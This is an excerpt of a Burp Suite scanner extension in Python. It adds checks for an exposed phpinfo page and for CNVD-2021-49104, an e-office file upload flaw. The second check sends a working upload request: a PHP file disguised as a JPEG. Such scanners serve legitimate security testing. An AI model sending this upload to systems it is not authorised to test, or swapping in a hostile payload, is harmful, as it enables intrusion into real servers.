    ...
    def registerExtenderCallbacks(self, this_callbacks):
        ...
        if not FAST_MODE:
            ...
            if collab_enabled:
                ...
                callbacks.registerScannerCheck(Phpinfo())
                callbacks.registerScannerCheck(CNVD_2021_49104_scan())
...
class Phpinfo(IScannerCheck):
    ...
    def doActiveScan(self, basePair, insertionPoint):
        ...
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path, url, 1)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), newReq)
        if "PHP Version" in safe_bytes_to_string(attack.getResponse()):
            issues.append(
                            CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(attack).getUrl(),
                                            [attack, ],
                                            'Interesting response',
...
class CNVD_2021_49104_scan(IScannerCheck):
    scanned_hosts = set()
    def doActiveScan(self, basePair, insertionPoint):
        
        request = basePair.getRequest()
        requestInfo = callbacks.getHelpers().analyzeRequest(basePair.getHttpService(), request)
        HOST = ""
        ...
        request_bodys = """--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php echo "Hello";?>
--e64bdf16c554bbc109cecef6451c26a4--"""
        a = helpers.buildHttpMessage(request_header, request_bodys)
        host = basePair.getHttpService().getHost()
        port = basePair.getHttpService().getPort()
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), a)
        if "logo-eoffice.php" in safe_bytes_to_string(attack.getResponse()):
            issues.append(
                            CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(attack).getUrl(),
                                            [attack, ],
                                            'CNVD-2021-49104',
                                            "e-office /images/logo/logo-eoffice.php",
                                            'Firm', 'High')
                        )
